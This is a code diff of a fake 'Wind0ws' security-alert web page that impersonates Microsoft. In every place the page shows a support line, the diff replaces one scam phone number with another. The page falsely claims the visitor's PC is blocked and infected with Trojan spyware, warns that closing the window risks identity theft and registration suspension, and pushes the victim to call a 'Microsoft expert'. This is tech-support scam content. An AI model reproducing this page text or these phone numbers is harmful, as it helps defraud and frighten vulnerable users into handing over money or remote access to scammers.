@@ -58,7 +58,7 @@ document.getElementById("welcomeDiv").style.display = "block";
   </script>
   <!--End of Tawk.to Script-->
   <script type="text/javascript">
-              var ph0ne = "+1-888-4606-726";
+              var ph0ne = "+1-833-392-5325";
           </script>
 
         </head>
@@ -267,7 +267,7 @@ document.getElementById("welcomeDiv").style.display = "block";
              <div class="col-md-6">
            <span class="fl title2" id="txts1">
               <a href="#" id="cross">
-                <p style="margin-right:50px;">+1-888-4606-726</p><p style="margin-right:30px;">❏ </p><p>❌</p><p></p>
+                <p style="margin-right:50px;">+1-833-392-5325</p><p style="margin-right:30px;">❏ </p><p>❌</p><p></p>
                       </a>
 
 
@@ -295,7 +295,7 @@ document.getElementById("welcomeDiv").style.display = "block";
             <div class="right-foot" style="text-align:center">
               <span id="footertxt">
                 <img src="images/msmm.png"> Wind0ws security </span>
-              <span style="font-weight:500;padding-left:13px;color:#fff; ">Wind0ws Support <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">    +1-888-4606-726
+              <span style="font-weight:500;padding-left:13px;color:#fff; ">Wind0ws Support <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">    +1-833-392-5325
                 </span>
               </span>
             </div>
@@ -330,7 +330,7 @@ document.getElementById("welcomeDiv").style.display = "block";
         </div>
         <img src="images/re.gif" id="banner">
         <div id="disclaimer" style="color:#0F396D;">Call support for help<br>
-           <span class="support" style="font-size:22px;">Wind0ws Support <span style="border:1px Solid #114d9a;border-radius:5px;padding:2px 5px">    +1-888-4606-726
+           <span class="support" style="font-size:22px;">Wind0ws Support <span style="border:1px Solid #114d9a;border-radius:5px;padding:2px 5px">    +1-833-392-5325
             </span>
           </span>
         </div>
@@ -367,7 +367,7 @@ document.getElementById("welcomeDiv").style.display = "block";
          <p>Call Wind0ws Support immediately to report this threat, prevent identity theft, and unblock access to this device. </p>
          <p>Closing this window may put your personal information at risk and may cause your Wind0ws registration to be suspended. </p>
          <p style="padding-bottom:0;color:#fff;font-size:16px">Wind0ws Please call support:<strong>
-            <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">   +1-888-4606-726
+            <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">   +1-833-392-5325
             </span>
           </strong>
         </p>
@@ -380,7 +380,7 @@ document.getElementById("welcomeDiv").style.display = "block";
       <div class="answer_list" style="display:none;background-color: rgb(40 40 40 / 80%);;height:auto;width:550px;margin-left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
         <p style="color:#FFFFFF;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">Access to this system has been blocked for security reasons. Do not access or restart this PC. If you overlook this basic warning, you may lose information about this framework. Contact support as soon as possible and a Microsoft expert will guide you through the investigation over the phone. Running this application may put your PC at risk。<br>
           <strong>
-         Wind0ws Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px">    +1-888-4606-726
+         Wind0ws Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px">    +1-833-392-5325
             </span>
           </strong>
         </p>
@@ -391,7 +391,7 @@ document.getElementById("welcomeDiv").style.display = "block";
         <br>
         <p>Wind0ws Technical Support
         </p>
-        <h4 style="font-weight:600;color:#0F396D;font-size:22px">    +1-888-4606-726
+        <h4 style="font-weight:600;color:#0F396D;font-size:22px">    +1-833-392-5325
           <br>( Toll-free number)<br><br>
         </h4>
         <div class="arrow-down">
@@ -423,7 +423,7 @@ Microsoft Wind0ws locked due to unusual activity.
 
 <img src="images/rasm.gif" width="250">
 
-<br>Your system has been reported to be infected with Trojan-type spyware.<br>For assistance, contact Microsoft Support<br><strong style="font-size:24px;">+1-888-4606-726			 	</strong></p>
+<br>Your system has been reported to be infected with Trojan-type spyware.<br>For assistance, contact Microsoft Support<br><strong style="font-size:24px;">+1-833-392-5325			 	</strong></p>
 
 </div>
 
